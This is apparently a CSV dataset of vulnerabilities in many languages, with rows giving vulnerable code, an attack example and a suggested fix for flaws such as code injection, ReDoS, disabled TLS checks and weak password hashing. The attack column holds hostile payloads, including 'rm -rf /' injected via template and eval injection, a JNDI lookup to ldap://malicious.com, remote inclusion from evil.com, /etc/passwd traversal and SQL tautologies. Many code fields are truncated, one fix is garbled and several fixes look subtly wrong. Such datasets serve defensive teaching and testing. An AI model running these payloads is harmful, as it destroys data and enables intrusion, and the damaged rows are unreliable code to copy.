vuln-307,Rust,Insecure Logging,Logging sensitive data to unsecured logs.,"log::info!(""User login: {}, {}"", user.email, user.password);",Access logs via misconfigured storage.,"Log: log::info!(""User login: {}"", user.id); Use log redaction.","log::info!(""User login: {}, {}"", user.email, user.password);",False,False,False,False,60,False,True,False,Other,1
vuln-308,Elixir,Insecure Logging,Logging sensitive data in plain text.,"Logger.info(""User login: #{user.email}, #{user.password}"")",Steal credentials from log files.,"Log: Logger.info(""User login: #{user.id}""); Secure log access.","Logger.info(""User login: #{user.email}, #{user.password}"")",False,False,False,False,58,False,True,False,Other,1
vuln-309,Perl,Insecure Logging,Logging sensitive data to files.,"print LOG ""User login: $user->{email}, $user->{password}\n"";",Access unprotected log files.,"Log: print LOG ""User login: $user->{id}\n""; Restrict log access.","print LOG ""User login: $user->{email}, $user->{password}\n"";",False,False,False,False,60,False,True,False,Other,1
vuln-310,Node.js,Prototype Pollution,Merging objects without sanitization.,"Object.assign({}, req.body);","Inject __proto__ to alter object behavior: {""__proto__"": {""admin"": true}}",Use Object.create(null) or libraries like lodash.cloneDeep.,"Object.assign({}, req.body);",True,False,False,False,28,False,False,False,Other,1
vuln-311,Python,Prototype Pollution Equivalent,Dynamic attribute assignment on objects.,"for key, value in user_input.items(): setattr(obj, key, value)",Inject __class__ or __init__ to manipulate object behavior.,"Whitelist allowed attributes: if key in allowed_attrs: setattr(obj, key, value)","for key, value in user_input.items(): setattr(obj, key, value)",True,False,False,False,62,False,False,False,Other,1
vuln-312,Java,Reflection Injection,Dynamic method invocation with user input.,Method method = Class.forName(className).getMethod(methodName); method.invoke(obj);,Invoke dangerous methods like Runtime.exec.,Whitelist allowed classes and methods.,Method method = Class.forName(className).getMethod(methodName); method.invoke(obj);,False,False,False,False,83,False,False,False,Injection,1
vuln-313,PHP,Dynamic Function Call,Calling functions based on user input.,$func = $_GET['action']; $func();,Call dangerous functions like eval or system.,"Whitelist: if (in_array($func, ['safe_func1', 'safe_func2'])) $func();",$func = $_GET['action']; $func();,False,False,False,False,33,False,True,False,Other,1
vuln-314,Ruby,Dynamic Method Invocation,Invoking methods based on user input.,obj.send(params[:method]),Call sensitive methods like instance_eval.,Whitelist: obj.send(method) if %w[safe_method1 safe_method2].include?(method),obj.send(params[:method]),True,False,False,False,25,False,False,False,Other,1
vuln-315,Go,Race Condition,Concurrent access to shared resources.,if counter > 0 { counter--; doWork() },Exploit TOCTOU to bypass checks.,Use sync.Mutex: mu.Lock(); defer mu.Unlock();,if counter > 0 { counter--; doWork() },False,False,False,False,38,False,False,False,Other,1
vuln-316,C# (.NET),Race Condition,Non-atomic operations on shared state.,if (counter > 0) { counter--; DoWork(); },Concurrent threads bypass counter check.,Use lock: lock (syncRoot) { if (counter > 0) counter--; },if (counter > 0) { counter--; DoWork(); },False,False,False,False,41,False,False,False,Other,1
vuln-317,Kotlin,Race Condition,Non-synchronized shared resource access.,if (counter > 0) { counter--; doWork() },Race condition to skip counter decrement.,Use synchronized: synchronized(lock) { if (counter > 0) counter-- },if (counter > 0) { counter--; doWork() },False,False,False,False,40,False,False,False,Other,1
vuln-318,Scala,Race Condition,Concurrent access to shared variable.,if (counter > 0) { counter -= 1; doWork() },Exploit race to bypass counter.,Use synchronized or Akka actors for concurrency.,if (counter > 0) { counter -= 1; doWork() },False,False,False,False,43,False,False,False,Other,1
vuln-319,Rust,Race Condition,Unsynchronized shared state access.,if *counter > 0 { *counter -= 1; do_work(); },Concurrent access bypasses counter.,Use Mutex: let mut counter = counter.lock().unwrap();,if *counter > 0 { *counter -= 1; do_work(); },False,False,False,False,45,False,False,False,Other,1
vuln-320,Elixir,Message Passing Race,Uncoordinated message passing in GenServer.,"def handle_call(:increment, _from, state), do: {:reply, :ok, state + 1}",Concurrent calls cause inconsistent state.,Use GenServer state management to enforce atomicity.,"def handle_call(:increment, _from, state), do: {:reply, :ok, state + 1}",False,False,False,False,71,False,False,True,Other,1
vuln-321,Perl,Race Condition,File access race condition.,"if (-e $file) { open(my $fh, '>', $file); }",TOCTOU attack to overwrite files.,Use flock for file locking.,"if (-e $file) { open(my $fh, '>', $file); }",False,False,True,False,43,False,True,False,Other,1
vuln-322,Node.js,Server-Side Template Injection,Dynamic template rendering with user input.,const template = Handlebars.compile(userInput); res.send(template(data));,Inject {{process.mainModule.require('child_process').execSync('rm -rf /')}},Avoid user input in templates; use precompiled templates.,const template = Handlebars.compile(userInput); res.send(template(data));,True,False,False,False,73,False,False,False,Injection,1
vuln-323,Python,Code Injection via Dynamic Execution,Executing user input as code.,exec(user_input),Inject: __import__('os').system('rm -rf /'),Never use exec; use safe alternatives like ast.literal_eval.,exec(user_input),True,True,False,True,16,False,False,False,Injection,1
vuln-324,Java,Script Engine Injection,Running user input in script engine.,"ScriptEngine engine = new ScriptEngineManager().getEngineByName(""js""); engine.eval(userInput);",Inject JavaScript to call Java methods.,Avoid user input in script engines; use static scripts.,"ScriptEngine engine = new ScriptEngineManager().getEngineByName(""js""); engine.eval(userInput);",True,False,False,True,94,False,True,False,Injection,1
vuln-325,PHP,Dynamic Include,Including files based on user input.,include $_GET['page'] . '.php';,Include malicious file: ?page=../../etc/passwd,"Whitelist: if (in_array($page, ['home', 'about'])) include $page . '.php';",include $_GET['page'] . '.php';,False,False,False,False,31,False,True,False,Other,1
vuln-326,Ruby,Dynamic Constant Assignment,Assigning constants dynamically with user input.,"Object.const_set(params[:name], Class.new)",Inject malicious class names to alter behavior.,Avoid dynamic constants; use predefined names.,"Object.const_set(params[:name], Class.new)",True,False,False,False,42,False,False,False,Other,1
vuln-327,Go,SQL Injection via Dynamic Queries,Dynamic SQL query construction.,"db.Query(fmt.Sprintf(""SELECT * FROM users WHERE name = '%s'"", userInput))",Inject: ' OR 1=1--,"Use prepared statements: db.Query(""SELECT * FROM users WHERE name = ?"", userInput)","db.Query(fmt.Sprintf(""SELECT * FROM users WHERE name = '%s'"", userInput))",True,True,False,False,73,False,True,True,Injection,1
vuln-328,C# (.NET),Dynamic Code Execution,Executing dynamic C# code.,"CSharpCodeProvider provider = new CSharpCodeProvider(); provider.CompileAssemblyFromSource(params, userInput).CreateInstance().Execute();",Inject malicious C# code.,Avoid dynamic code execution; use static assemblies.,"CSharpCodeProvider provider = new CSharpCodeProvider(); provider.CompileAssemblyFromSource(params, userInput).CreateInstance().Execute();",True,True,False,True,137,False,False,False,Other,1
vuln-329,Kotlin,Script Engine Injection,Running user input in Kotlin script engine.,val engine = KotlinJsr223JvmLocalScriptEngineFactory().scriptEngine; engine.eval(userInput),Inject malicious Kotlin code.,Use static scripts; avoid user input.,val engine = KotlinJsr223JvmLocalScriptEngineFactory().scriptEngine; engine.eval(userInput),True,False,False,True,91,False,False,False,Injection,1
vuln-330,Scala,Dynamic Code Evaluation,Evaluating user input as Scala code.,scala.tools.nsc.interpreter.IMain().interpret(userInput),Inject malicious Scala code.,Avoid dynamic evaluation; use predefined logic.,scala.tools.nsc.interpreter.IMain().interpret(userInput),True,False,False,False,56,False,False,False,Other,1
vuln-331,Rust,Unsafe Memory Access,Using unsafe block with unvalidated input.,unsafe { let ptr = input as *mut i32; *ptr = 42; },Manipulate pointer to cause memory corruption.,Avoid unsafe; use safe Rust abstractions.,unsafe { let ptr = input as *mut i32; *ptr = 42; },True,False,False,False,50,False,False,False,Other,1
vuln-332,Elixir,Dynamic Code Execution,Evaluating user input as Elixir code.,Code.eval_string(user_input),"Inject: System.cmd(""rm"", [""-rf"", ""/""])",Never evaluate user input; use static functions.,Code.eval_string(user_input),True,False,False,True,28,False,False,False,Other,1
vuln-333,Perl,Dynamic Code Execution,Evaluating user input as Perl code.,eval $user_input;,Inject: system('rm -rf /');,Avoid eval; use predefined subroutines.,eval $user_input;,True,False,False,True,17,False,False,False,Other,1
vuln-334,Node.js,Regex Injection,Using user input in regex patterns.,const regex = new RegExp(req.query.pattern); string.match(regex);,Inject complex regex for ReDoS.,Sanitize: if (!pattern.match(/^[a-zA-Z0-9]+$/)) throw Error('Invalid pattern');,const regex = new RegExp(req.query.pattern); string.match(regex);,True,True,False,False,65,False,False,False,Injection,1
vuln-335,Python,Regex Injection,Dynamic regex from user input.,regex = re.compile(request.args.get('pattern')); regex.match(string),Inject: (a+)+ for ReDoS attack.,"Validate: if re.match(r'^[a-zA-Z0-9]+$', pattern): re.compile(pattern)",regex = re.compile(request.args.get('pattern')); regex.match(string),False,False,False,False,68,False,True,False,Injection,1
vuln-336,Java,Regex Injection,Dynamic regex compilation.,"Pattern pattern = Pattern.compile(request.getParameter(""pattern"")); pattern.matcher(string);",Inject complex regex for DoS.,"Validate: if (pattern.matches(""^[a-zA-Z0-9]+$"")) Pattern.compile(pattern);","Pattern pattern = Pattern.compile(request.getParameter(""pattern"")); pattern.matcher(string);",True,False,False,False,92,False,True,False,Injection,1
vuln-337,PHP,Regex Injection,User input in preg_match pattern.,"preg_match('/' . $_GET['pattern'] . '/', $string);",Inject: (a+)+ for ReDoS.,"Validate: if (preg_match('/^[a-zA-Z0-9]+$/', $pattern)) preg_match('/' . $pattern . '/');","preg_match('/' . $_GET['pattern'] . '/', $string);",False,False,False,False,50,False,True,False,Injection,1
vuln-338,Ruby,Regex Injection,Dynamic regex from user input.,regex = Regexp.new(params[:pattern]); string =~ regex,Inject: (a+)+ for ReDoS.,Validate: regex = Regexp.new(pattern) if pattern =~ /^[a-zA-Z0-9]+$/;,regex = Regexp.new(params[:pattern]); string =~ regex,True,False,False,False,53,False,False,False,Injection,1
vuln-339,Go,Regex Injection,Dynamic regex compilation.,"regex, _ := regexp.Compile(r.URL.Query().Get(""pattern"")); regex.MatchString(string)",Inject complex regex for DoS.,"Validate: if regexp.MatchString(`^[a-zA-Z0-9]+$`, pattern) { regexp.Compile(pattern) }","regex, _ := regexp.Compile(r.URL.Query().Get(""pattern"")); regex.MatchString(string)",True,True,False,False,83,False,True,False,Injection,1
vuln-340,C# (.NET),Regex Injection,Dynamic regex from user input.,"Regex regex = new Regex(Request.Query[""pattern""]); regex.IsMatch(input);",Inject: (a+)+ for ReDoS.,"Validate: if (Regex.IsMatch(pattern, ""^[a-zA-Z0-9]+$"")) new Regex(pattern);","Regex regex = new Regex(Request.Query[""pattern""]); regex.IsMatch(input);",True,True,False,False,72,False,True,False,Injection,1
vuln-341,Kotlin,Regex Injection,Dynamic regex compilation.,"val regex = request.queryParameters[""pattern""]!!.toRegex(); regex.matches(input)",Inject complex regex for DoS.,"Validate: if (pattern.matches(Regex(""^[a-zA-Z0-9]+$""))) pattern.toRegex()","val regex = request.queryParameters[""pattern""]!!.toRegex(); regex.matches(input)",True,True,False,False,80,False,True,False,Injection,1
vuln-342,Scala,Regex Injection,Dynamic regex from user input.,"val regex = params(""pattern"").r; regex.findFirstIn(input)",Inject: (a+)+ for ReDoS.,"Validate: if (pattern.matches(""^[a-zA-Z0-9]+$"")) pattern.r","val regex = params(""pattern"").r; regex.findFirstIn(input)",True,False,False,False,57,False,True,False,Injection,1
vuln-343,Rust,Regex Injection,Dynamic regex compilation.,"let regex = Regex::new(&req.query(""pattern"")?).unwrap(); regex.is_match(&input)",Inject complex regex for DoS.,Validate: if pattern.chars().all(|c| c.is_alphanumeric()) { Regex::new(&pattern) },"let regex = Regex::new(&req.query(""pattern"")?).unwrap(); regex.is_match(&input)",True,True,False,False,79,False,True,False,Injection,1
vuln-344,Elixir,Regex Injection,Dynamic regex from user input.,"regex = Regex.compile!(params[:pattern]); Regex.match?(regex, input)",Inject: (a+)+ for ReDoS.,"Validate: if String.match?(pattern, ~r/^[a-zA-Z0-9]+$/) do Regex.compile!(pattern) end","regex = Regex.compile!(params[:pattern]); Regex.match?(regex, input)",True,False,False,False,68,False,False,False,Injection,1
vuln-345,Perl,Regex Injection,Dynamic regex from user input.,if ($input =~ /$pattern/) { ... },Inject: (a+)+ for ReDoS.,Validate: if ($pattern =~ /^[a-zA-Z0-9]+$/) { ... },if ($input =~ /$pattern/) { ... },True,False,False,False,33,False,False,False,Injection,1
vuln-346,Node.js,Prototype Pollution in Dependencies,Vulnerable library allowing prototype pollution.,"const merge = require('lodash.merge'); merge({}, JSON.parse(userInput));",Inject __proto__ to alter object behavior.,Update to patched lodash version; avoid deep merges with user input.,"const merge = require(); merge({}, JSON.parse(userInput));",True,False,False,False,72,False,True,False,Other,1
vuln-347,Python,Insecure Pickle Usage,Deserialization of untrusted pickle data.,import pickle; obj = pickle.loads(request.data),Craft malicious pickle payload for RCE.,Use JSON or YAML.safe_load; avoid pickle for user input.,import pickle; obj = pickle.loads(request.data),False,False,False,False,47,False,False,False,Other,1
vuln-348,Java,JNDI Injection,Untrusted input in JNDI lookups.,InitialContext ctx = new InitialContext(); ctx.lookup(userInput);,Inject: ldap://malicious.com/a for RCE.,Validate input; disable JNDI remote lookups.,InitialContext ctx = new InitialContext(); ctx.lookup(userInput);,True,False,False,False,65,False,False,False,Injection,1
vuln-349,PHP,Remote File Inclusion,Including remote files based on user input.,include($_GET['file']);,Inject: http://evil.com/malicious.php,Disable allow_url_include; whitelist local files.,include($_GET['file']);,False,False,False,False,23,False,True,False,File_Handling,1
vuln-350,Ruby,Mass Assignment Vulnerability,Unrestricted model attribute updates.,User.update(params[:user]),Inject admin: true in params.,"Use strong parameters: params.require(:user).permit(:name, :email)",User.update(params[:user]),True,True,False,False,26,False,False,False,Other,1
vuln-351,Go,Insecure HTTP Client,HTTP client without TLS verification.,client := &http.Client{Transport: &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}};,MITM attacks to intercept traffic.,Set InsecureSkipVerify: false; validate certificates.,client := &http.Client{Transport: &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}};,False,False,False,False,107,False,False,False,Other,1
vuln-352,C# (.NET),Insecure TLS Configuration,Ignoring TLS certificate validation.,"ServicePointManager.ServerCertificateValidationCallback = (sender, cert, chain, errors) => true;",MITM attack to spoof server.,Use default validation or custom strict validation.,"ServicePointManager.ServerCertificateValidationCallback = (sender, cert, chain, errors) => true;",False,False,False,True,96,False,False,False,Configuration,1
vuln-353,Kotlin,Insecure TLS Configuration,Bypassing TLS certificate checks.,"val client = OkHttpClient.Builder().sslSocketFactory(trustAllCerts(), TrustAllCerts()).build()",MITM to intercept requests.,Use default SSL configuration with proper validation.,"val client = OkHttpClient.Builder().sslSocketFactory(trustAllCerts(), TrustAllCerts()).build()",False,False,False,False,94,False,False,False,Configuration,1
vuln-354,Scala,Insecure TLS Configuration,Disabling TLS verification.,WSClient(wsConfig.copy(ssl = SSLConfig(loose = SSLLooseConfig(disableCertificateVerification = true))),MITM attack to spoof server.,Enable certificate verification.,WSClient(wsConfig.copy(ssl = SSLConfig(loose = SSLLooseConfig(disableCertificateVerification = true))),False,False,False,False,102,False,False,False,Configuration,1
vuln-355,Rust,Insecure TLS Configuration,Skipping TLS certificate validation.,let client = Client::builder().danger_accept_invalid_certs(true).build()?;,MITM to intercept traffic.,Use default TLS settings with validation.,let client = Client::builder().danger_accept_invalid_certs(true).build()?;,False,False,False,False,74,False,False,False,Configuration,1
vuln-356,Elixir,Insecure TLS Configuration,Disabling TLS verification.,":httpc.request(:get, {url, [ssl: [verify: :verify_none]]}, [], [])",MITM attack to spoof server.,Set verify: :verify_peer; use CA certificates.,":httpc.request(:get, {url, [ssl: [verify: :verify_none]]}, [], [])",False,False,False,False,66,False,False,False,Configuration,1
vuln-357,Perl,Insecure TLS Configuration,Bypassing TLS certificate checks.,use LWP::UserAgent; $ua->ssl_opts(verify_hostname => 0);,MITM to intercept requests.,Enable ssl_opts(verify_hostname => 1).,use LWP::UserAgent; $ua->ssl_opts(verify_hostname => 0);,False,False,False,False,56,False,False,False,Configuration,1
vuln-358,Node.js,Insecure WebSocket,Unencrypted WebSocket connections.,const ws = new WebSocket('ws://example.com');,MITM to intercept WebSocket traffic.,Use wss:// for encrypted connections.,const ws = new WebSocket('ws:,False,False,False,False,45,False,True,False,Other,1
vuln-359,Python,Insecure WebSocket,Using ws:// instead of wss://.,websocket.connect('ws://example.com'),Sniff unencrypted WebSocket traffic.,Use websocket.connect('wss://example.com'),websocket.connect('ws:,False,False,False,False,37,False,True,False,Other,1
vuln-360,Java,Insecure WebSocket,Unencrypted WebSocket connections.,"WebSocketClient client = new WebSocketClient(new URI(""ws://example.com""));",MITM to capture WebSocket data.,Use wss://example.com for secure connections.,"WebSocketClient client = new WebSocketClient(new URI(""ws:",False,False,False,False,74,False,True,False,Other,1
vuln-361,PHP,Insecure WebSocket,Using unencrypted WebSocket.,$client = new WebSocket('ws://example.com');,Intercept unencrypted traffic.,Use wss:// for WebSocket connections.,$client = new WebSocket('ws:,False,False,False,False,44,False,True,False,Other,1
vuln-362,Ruby,Insecure WebSocket,Unencrypted WebSocket connection.,Faye::WebSocket::Client.new('ws://example.com'),Sniff WebSocket traffic.,Use wss://example.com for secure connection.,Faye::WebSocket::Client.new('ws:,False,False,False,False,47,False,True,False,Other,1
vuln-363,Go,Insecure WebSocket,Using ws:// WebSocket.,"ws, _ := websocket.Dial(""ws://example.com"", """", ""http://localhost"")",MITM to intercept data.,Use wss:// for encrypted WebSocket.,"ws, _ := websocket.Dial(""ws:",False,False,False,False,67,False,True,False,Other,1
vuln-364,C# (.NET),Insecure WebSocket,Unencrypted WebSocket connection.,"var ws = new ClientWebSocket(); await ws.ConnectAsync(new Uri(""ws://example.com""), CancellationToken.None);",Capture unencrypted WebSocket traffic.,Use wss://example.com for secure connection.,"var ws = new ClientWebSocket(); await ws.ConnectAsync(new Uri(""ws:",False,False,False,False,107,False,True,False,Other,1
vuln-365,Kotlin,Insecure WebSocket,Using ws:// instead of wss://.,"val ws = WebSocket(""ws://example.com"")",MITM to intercept traffic.,Use wss://example.com for secure WebSocket.,"val ws = WebSocket(""ws:",False,False,False,False,38,False,True,False,Other,1
vuln-366,Scala,Insecure WebSocket,Unencrypted WebSocket connection.,"val ws = WebSocket(""ws://example.com"")",Sniff unencrypted WebSocket data.,Use wss:// for secure connection.,"val ws = WebSocket(""ws:",False,False,False,False,38,False,True,False,Other,1
vuln-367,Rust,Insecure WebSocket,Using ws:// WebSocket.,"let ws = tungstenite::connect(Url::parse(""ws://example.com"")?).1;",MITM to capture traffic.,"Use wss AldoWebSocket::connect(Url::parse(""wss://example.com"")?).1","let ws = tungstenite::connect(Url::parse(""ws:",False,False,False,False,65,False,True,False,Other,1
vuln-368,Elixir,Insecure WebSocket,Unencrypted WebSocket connections.,"web_socket = WebSocket.connect(""ws://example.com"")",Intercept unencrypted WebSocket traffic.,Use wss://example.com for secure connections.,"web_socket = WebSocket.connect(""ws:",False,False,False,False,50,False,True,False,Other,1
vuln-369,Perl,Insecure WebSocket,Using unencrypted ws://.,my $ws = Net::WebSocket::Client->new('ws://example.com');,Sniff WebSocket traffic.,Use wss:// for encrypted WebSocket.,my $ws = Net::WebSocket::Client->new('ws:,False,False,False,False,57,False,True,False,Other,1
vuln-370,Node.js,Insecure JSONP,JSONP callback without validation.,"res.jsonp({ data: sensitiveData }, req.query.callback);",Inject malicious callback to steal data.,Validate callback names; avoid JSONP if possible.,"res.jsonp({ data: sensitiveData }, req.query.callback);",True,True,False,False,55,False,False,False,Other,1
vuln-371,Python,Insecure JSONP,Unvalidated JSONP callback.,callback = request.args.get('callback'); return f'{callback}({json.dumps(data)})';,Inject malicious callback function.,Whitelist callbacks or use CORS instead.,callback = request.args.get('callback'); return f'{callback}({json.dumps(data)})';,False,False,False,False,82,False,True,False,Other,1
vuln-372,Java,Insecure JSONP,JSONP with unvalidated callback.,"String callback = request.getParameter(""callback""); response.getWriter().write(callback + ""("" + data + "")"");",Inject malicious callback to steal data.,Validate callback; prefer CORS.,"String callback = request.getParameter(""callback""); response.getWriter().write(callback + ""("" + data + "")"");",True,False,False,False,108,False,True,True,Other,1
vuln-373,PHP,Insecure JSONP,Unvalidated JSONP callback.,"$callback = $_GET['callback']; echo ""$callback($data);"";",Inject malicious callback function.,"Validate: if (preg_match('/^[a-zA-Z0-9_]+$/', $callback)) echo ""$callback($data);"";","$callback = $_GET['callback']; echo ""$callback($data);"";",False,False,False,False,56,False,True,False,Other,1
vuln-374,Ruby,Insecure JSONP,JSONP callback without validation.,"render json: data, callback: params[:callback]",Inject malicious callback to steal data.,Validate callback names; use CORS.,"render json: data, callback: params[:callback]",True,False,False,False,46,False,False,False,Other,1
vuln-375,Go,Insecure JSONP,Unvalidated JSONP callback.,"callback := r.URL.Query().Get(""callback""); fmt.Fprintf(w, ""%s(%s)"", callback, data)",Inject malicious callback function.,Validate callback with regex; prefer CORS.,"callback := r.URL.Query().Get(""callback""); fmt.Fprintf(w, ""%s(%s)"", callback, data)",True,True,False,False,83,False,True,True,Other,1
vuln-376,C# (.NET),Insecure JSONP,JSONP with unvalidated callback.,"var callback = Request.Query[""callback""]; return Content($""{callback}({data})"");",Inject malicious callback to steal data.,"Validate: if (Regex.IsMatch(callback, ""^[a-zA-Z0-9_]+$"")) return Content(...);","var callback = Request.Query[""callback""]; return Content($""{callback}({data})"");",True,True,False,False,80,False,True,False,Other,1
vuln-377,Kotlin,Insecure JSONP,Unvalidated JSONP callback.,"val callback = call.request.queryParameters[""callback""]; call.respondText(""$callback($data)"")",Inject malicious callback function.,"Validate: if (callback?.matches(Regex(""^[a-zA-Z0-9_]+$"")) == true) respond","val callback = call.request.queryParameters[""callback""]; call.respondText(""$callback($data)"")",True,True,False,False,93,False,True,False,Other,1
vuln-378,Scala,Insecure JSONP,JSONP callback without validation.,"val callback = params(""callback""); Ok(s""$callback($data)"")",Inject malicious callback to steal data.,"Validate: if (callback.matches(""^[a-zA-Z0-9_]+$"")) Ok(...)","val callback = params(""callback""); Ok(s""$callback($data)"")",True,False,False,False,58,False,True,False,Other,1
vuln-379,Rust,Insecure JSONP,Unvalidated JSONP callback.,"let callback = req.query(""callback"")?; res.render_text(format!(""{}({})"", callback, data))",Inject malicious callback function.,Validate: if callback.chars().all(|c| c.is_alphanumeric() || c == '_') { render },"let callback = req.query(""callback"")?; res.render_text(format!(""{}({})"", callback, data))",True,True,False,False,89,False,True,False,Other,1
vuln-380,Elixir,Insecure JSONP,JSONP with unvalidated callback.,"callback = params[""callback""]; send_resp(conn, 200, ""#{callback}(#{data})"")",Inject malicious callback to steal data.,"Validate: if String.match?(callback, ~r/^[a-zA-Z0-9_]+$/) do send_resp","callback = params[""callback""]; send_resp(conn, 200, ""#{callback}(#{data})"")",True,False,False,False,75,False,True,False,Other,1
vuln-381,Perl,Insecure JSONP,Unvalidated JSONP callback.,"my $callback = $r->param('callback'); print ""$callback($data);"";",Inject malicious callback function.,"Validate: print ""$callback($data);"" if $callback =~ /^[a-zA-Z0-9_]+$/;","my $callback = $r->param('callback'); print ""$callback($data);"";",True,False,False,False,64,False,True,False,Other,1
vuln-382,Node.js,Weak Password Hashing,Using weak or unsalted hash for passwords.,const hash = crypto.createHash('md5').update(password).digest('hex');,Crack hashes with rainbow tables.,"Use bcrypt: bcrypt.hashSync(password, 10)",const hash = crypto.createHash('md5').update(password).digest('hex');,False,True,False,False,69,False,True,False,Other,1
vuln-383,Python,Weak Password Hashing,Using MD5 or SHA1 for passwords.,hash = hashlib.md5(password.encode()).hexdigest(),Use rainbow tables to reverse hashes.,"Use bcrypt: bcrypt.hashpw(password.encode(), bcrypt.gensalt())",hash = hashlib.md5(password.encode()).hexdigest(),False,False,False,False,49,False,False,False,Other,1
vuln-384,Java,Weak Password Hashing,Using weak hashing algorithm for passwords.,"MessageDigest md = MessageDigest.getInstance(""SHA1""); String hash = md.digest(password.getBytes());",Crack with precomputed tables.,"Use BCrypt: BCrypt.hashpw(password, BCrypt.gensalt())","MessageDigest md = MessageDigest.getInstance(""SHA1""); String hash = md.digest(password.getBytes());",False,False,False,False,99,False,True,False,Other,1
vuln-385,PHP,Weak Password Hashing,Using MD5 for password storage.,$hash = md5($password);,Reverse hashes with rainbow tables.,"Use password_hash($password, PASSWORD_BCRYPT)",$hash = md5($password);,False,False,False,False,23,False,False,False,Other,1
vuln-386,Ruby,Weak Password Hashing,Using unsalted SHA1 for passwords.,hash = Digest::SHA1.hexdigest(password),Crack with precomputed tables.,Use BCrypt: BCrypt::Password.create(password),hash = Digest::SHA1.hexdigest(password),False,False,False,False,39,False,False,False,Other,1
vuln-387,Go,Weak Password Hashing,Using weak hash for passwords.,hash := sha1.Sum([]byte(password)),Use rainbow tables to crack hashes.,"Use bcrypt: bcrypt.GenerateFromPassword([]byte(password), bcrypt.DefaultCost)",hash := sha1.Sum([]byte(password)),False,False,False,False,34,False,False,False,Other,1
vuln-388,C# (.NET),Weak Password Hashing,Using MD5 for password storage.,var hash = MD5.Create().ComputeHash(Encoding.UTF8.GetBytes(password));,Crack with rainbow tables.,"Use BCrypt: BCrypt.Net.BCrypt.HashPassword(password, 12)",var hash = MD5.Create().ComputeHash(Encoding.UTF8.GetBytes(password));,False,False,False,False,70,False,False,False,Other,1
vuln-389,Kotlin,Weak Password Hashing,Using SHA1 for passwords.,"val hash = MessageDigest.getInstance(""SHA1"").digest(password.toByteArray())",Reverse hashes with tables.,"Use BCrypt: BCrypt.hashpw(password, BCrypt.gensalt())","val hash = MessageDigest.getInstance(""SHA1"").digest(password.toByteArray())",False,False,False,False,75,False,True,False,Other,1
vuln-390,Scala,Weak Password Hashing,Using weak hash algorithm.,"val hash = MessageDigest.getInstance(""MD5"").digest(password.getBytes)",Crack with precomputed tables.,"Use BCrypt: BCrypt.hashpw(password, BCrypt.gensalt())","val hash = MessageDigest.getInstance(""MD5"").digest(password.getBytes)",False,False,False,False,69,False,True,False,Other,1
vuln-391,Rust,Weak Password Hashing,Using SHA1 for password hashing.,let hash = sha1::Sha1::from(password).digest().bytes();,Use rainbow tables to crack.,"Use bcrypt::hash(password, DEFAULT_COST)",let hash = sha1::Sha1::from(password).digest().bytes();,False,False,False,False,55,False,False,False,Other,1
vuln-392,Elixir,Weak Password Hashing,Using weak hash for passwords.,"hash = :crypto.hash(:md5, password)",Crack with rainbow tables.,Use Bcrypt.hash_pwd_salt(password),"hash = :crypto.hash(:md5, password)",False,False,False,False,35,False,False,False,Other,1
vuln-393,Perl,Weak Password Hashing,Using MD5 for password storage.,use Digest::MD5 qw(md5_hex); my $hash = md5_hex($password);,Reverse with rainbow tables.,"Use Crypt::Bcrypt: bcrypt_hash($password, '$2a$12$salt')",use Digest::MD5 qw(md5_hex); my $hash = md5_hex($password);,False,False,False,False,59,False,False,False,Other,1
vuln-394,Node.js,Insecure Session Timeout,Sessions without expiration or long timeout.,"app.use(session({ secret: 'secret', cookie: { maxAge: null } }));",Steal session cookies for persistent access.,Set short timeout: cookie: { maxAge: 3600000 } // 1 hour,"app.use(session({ secret: 'secret', cookie: { maxAge: null } }));",False,False,False,False,65,False,True,False,Authentication,1
vuln-395,Python,Insecure Session Timeout,No session expiration.,app.config['SESSION_COOKIE_LIFETIME'] = None,Reuse stolen cookies indefinitely.,Set: app.config['SESSION_COOKIE_LIFETIME'] = timedelta(hours=1),app.config['SESSION_COOKIE_LIFETIME'] = None,False,False,False,False,44,False,True,False,Authentication,1
vuln-396,Java,Insecure Session Timeout,Long or no session timeout.,session.setMaxInactiveInterval(0);,Persistent session hijacking.,Set: session.setMaxInactiveInterval(3600); // 1 hour,session.setMaxInactiveInterval(0);,False,False,False,False,34,False,False,False,Authentication,1
vuln-397,PHP,Insecure Session Timeout,No session expiration time.,session_set_cookie_params(0);,Steal cookies for indefinite access.,Set: session_set_cookie_params(3600); // 1 hour,session_set_cookie_params(0);,True,False,False,False,29,False,False,False,Authentication,1
vuln-398,Ruby,Insecure Session Timeout,Sessions without timeout.,"config.session_store :cookie_store, expire_after: nil",Persistent session cookie attacks.,Set: expire_after: 1.hour,"config.session_store :cookie_store, expire_after: nil",False,False,False,False,53,False,False,False,Authentication,1
vuln-399,Go,Insecure Session Timeout,No session cookie expiration.,"http.SetCookie(w, &http.Cookie{Name: ""session"", Value: id, Expires: time.Time{}})",Reuse cookies indefinitely.,Set: Expires: time.Now().Add(1 * time.Hour),"http.SetCookie(w, &http.Cookie{Name: ""session"", Value: id, Expires: time.Time{}})",False,False,False,False,81,False,True,False,Authentication,1
vuln-400,C# (.NET),Insecure Session Timeout,No session expiration.,services.AddSession(options => { options.IdleTimeout = TimeSpan.Zero; });,Persistent session hijacking.,Set: options.IdleTimeout = TimeSpan.FromHours(1);,services.AddSession(options => { options.IdleTimeout = TimeSpan.Zero; });,False,False,False,False,73,False,False,False,Authentication,1
vuln-401,Kotlin,Insecure Session Timeout,No session expiration configured.,sessionConfig { cookie.maxAgeInSeconds = 0 },Steal session cookies for persistent access.,Set timeout: cookie.maxAgeInSeconds = 3600 // 1 hour,sessionConfig { cookie.maxAgeInSeconds = 0 },False,False,False,False,44,False,False,False,Authentication,1
vuln-402,Scala,Insecure Session Timeout,Sessions without expiration.,sessionConfig.withMaxAge(None),Reuse stolen cookies indefinitely.,Set: sessionConfig.withMaxAge(Some(3600.seconds)),sessionConfig.withMaxAge(None),False,False,False,False,30,False,False,False,Authentication,1
vuln-403,Rust,Insecure Session Timeout,No expiration for session cookies.,cookie.set_expires(None);,Persistent session hijacking.,Set: cookie.set_expires(OffsetDateTime::now_utc() + Duration::hours(1)),cookie.set_expires(None);,False,False,False,False,25,False,False,False,Authentication,1
vuln-404,Elixir,Insecure Session Timeout,No session expiration time.,"plug :fetch_session; put_session(conn, :user_id, id)",Steal cookies for indefinite access.,"Set: put_session(conn, :user_id, id, max_age: 3600)","plug :fetch_session; put_session(conn, :user_id, id)",False,False,False,False,52,False,False,False,Authentication,1
